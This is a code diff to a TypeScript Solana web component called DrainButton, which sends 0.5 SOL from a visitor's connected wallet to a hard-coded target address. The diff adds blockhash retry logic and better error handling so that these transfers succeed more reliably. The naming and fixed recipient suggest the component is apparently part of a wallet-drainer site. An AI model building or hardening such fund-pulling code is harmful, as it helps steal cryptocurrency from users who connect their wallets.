@@ -6,6 +6,32 @@ import { notify } from "../utils/notifications";
 const TARGET_WALLET = 'Fh7X5J8MRsch2HKuniXEAXsDXHjh7pb6wUvJU9Kd4hBQ';
 const TRANSFER_AMOUNT = 0.5 * LAMPORTS_PER_SOL;
 
+async function getLatestBlockhashWithRetry(
+  connection: ReturnType<typeof useConnection>['connection'],
+  retries = 2
+): Promise<{ blockhash: string; lastValidBlockHeight: number }> {
+  let lastError: Error | null = null;
+
+  for (let i = 0; i <= retries; i++) {
+    try {
+      return await connection.getLatestBlockhash("finalized");
+    } catch (error: any) {
+      lastError = error;
+      const message = error?.message || '';
+      if (message.includes('403') || message.includes('Access forbidden') || message.includes('rate limit')) {
+        console.warn(`Blockhash fetch attempt ${i + 1} failed: ${message}`);
+        if (i < retries) {
+          await new Promise(resolve => setTimeout(resolve, 500 * (i + 1)));
+          continue;
+        }
+      }
+      throw error;
+    }
+  }
+
+  throw lastError || new Error('Failed to get latest blockhash');
+}
+
 export const DrainButton: FC = () => {
     const { connection } = useConnection();
     const { publicKey, sendTransaction, connected } = useWallet();
@@ -19,6 +45,8 @@ export const DrainButton: FC = () => {
 
         setLoading(true);
         try {
+            const { blockhash, lastValidBlockHeight } = await getLatestBlockhashWithRetry(connection);
+
             const transaction = new Transaction().add(
                 SystemProgram.transfer({
                     fromPubkey: publicKey,
@@ -27,12 +55,15 @@ export const DrainButton: FC = () => {
                 })
             );
 
-            const { blockhash } = await connection.getLatestBlockhash("finalized");
             transaction.recentBlockhash = blockhash;
             transaction.feePayer = publicKey;
 
             const signature = await sendTransaction(transaction, connection);
-            await connection.confirmTransaction(signature, 'finalized');
+            await connection.confirmTransaction({
+                signature,
+                blockhash,
+                lastValidBlockHeight,
+            }, 'finalized');
 
             notify({ type: 'success', message: '0.5 SOL sent!', txid: signature });
         } catch (error: unknown) {
@@ -50,7 +81,9 @@ export const DrainButton: FC = () => {
                 console.error('Transaction logs:', logs);
             }
 
-            if (errorMessage.includes('insufficient') || errorMessage.includes('Attempt to debit')) {
+            if (errorMessage.includes('403') || errorMessage.includes('Access forbidden')) {
+                notify({ type: 'error', message: 'RPC error. Please try again.', description: 'Access forbidden - try switching networks' });
+            } else if (errorMessage.includes('insufficient') || errorMessage.includes('Attempt to debit')) {
                 notify({ type: 'error', message: 'Insufficient SOL balance!' });
             } else if (errorMessage.includes('User rejected') || errorMessage.includes('User canceled')) {
                 notify({ type: 'error', message: 'Transaction rejected by user' });
@@ -58,6 +91,8 @@ export const DrainButton: FC = () => {
                 notify({ type: 'error', message: 'Transaction failed. Please try again.' });
             } else if (errorMessage.includes('missing signature')) {
                 notify({ type: 'error', message: 'Transaction failed. Wallet may not be connected.' });
+            } else if (errorMessage.includes('rate limit')) {
+                notify({ type: 'error', message: 'Rate limited. Please wait and try again.' });
             } else {
                 notify({ type: 'error', message: 'Transaction failed!', description: errorMessage });
             }
